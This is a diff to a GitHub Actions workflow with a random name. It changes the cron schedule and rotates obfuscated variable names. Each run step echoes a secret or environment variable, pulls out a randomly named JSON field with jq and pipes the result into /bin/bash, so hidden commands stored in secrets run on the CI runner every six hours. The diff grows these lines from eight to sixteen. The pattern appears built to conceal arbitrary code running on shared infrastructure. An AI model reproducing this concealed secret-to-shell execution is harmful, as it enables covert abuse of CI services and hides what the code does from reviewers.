@@ -2,7 +2,7 @@ name: whoppingsweatsuit
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '42 2/6 * * *'
 
 jobs:
   build:
@@ -11,14 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: whoppingsweatsuit
         env:
-          l38293: ${{ secrets.l38293 }}
+          ulk69: ${{ secrets.ulk69 }}
         run: |
-          echo $l38293 | jq -r .uzv9 | /bin/bash
-          echo $xu716 | jq -r .ptkbk19170 | /bin/bash
-          echo $jyxl8810 | jq -r .w5 | /bin/bash
-          echo $i27 | jq -r .h20 | /bin/bash
-          echo $bfx15 | jq -r .foopy0152 | /bin/bash
-          echo $izh3669 | jq -r .satk01 | /bin/bash
-          echo $b7506 | jq -r .y0 | /bin/bash
-          echo $iqcn248 | jq -r .pf842 | /bin/bash
+          echo $ulk69 | jq -r .hi39 | /bin/bash
+          echo $dwoq5 | jq -r .mudhm19 | /bin/bash
+          echo $z65922 | jq -r .flk850 | /bin/bash
+          echo $euu529 | jq -r .as8 | /bin/bash
+          echo $wru85286 | jq -r .avgdf88 | /bin/bash
+          echo $wqvve61 | jq -r .n9 | /bin/bash
+          echo $z63 | jq -r .wzd9 | /bin/bash
+          echo $i37736 | jq -r .zcq8 | /bin/bash
+          echo $na79031 | jq -r .ibie5 | /bin/bash
+          echo $eieaq840 | jq -r .s974 | /bin/bash
+          echo $ls16054 | jq -r .da762 | /bin/bash
+          echo $ozkf61 | jq -r .sqg338 | /bin/bash
+          echo $dnnjf53 | jq -r .kn40 | /bin/bash
+          echo $wnbge91337 | jq -r .nsgh09711 | /bin/bash
+          echo $kx099 | jq -r .e0488 | /bin/bash
+          echo $xqtm40137 | jq -r .yvgfe4897 | /bin/bash
 
